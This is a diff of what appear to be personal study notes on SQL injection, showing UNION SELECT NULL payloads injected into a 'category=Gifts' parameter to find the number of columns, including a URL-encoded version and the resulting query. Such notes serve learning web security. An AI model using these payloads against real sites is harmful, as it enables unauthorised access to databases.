@@ -36,11 +36,12 @@ SQLi attack (way #1):
 category=Gifts'UNION select NULL-- gives us an internal server error because there's
 probably more than one column in the query.
 Keep going interatively
-
 category=Gifts'UNION select NULL, NULL--
 category=Gifts'UNION select NULL, NULL, NULL--
 Gifts'UNION%20select%20NULL%2c%20NULL%2c%20NULL--
-Behind: category='Gifts' UNION select NULL,NULL,NULL--'
+Injection:Gifts'UNION select NULL,NULL--
+category='Gifts' UNION select NULL,NULL,NULL--'
+category='Gifts' UNION select NULL,NULL,NULL
 
 select ? from table1 UNION select NULL
 -error -> incorrect number of columns
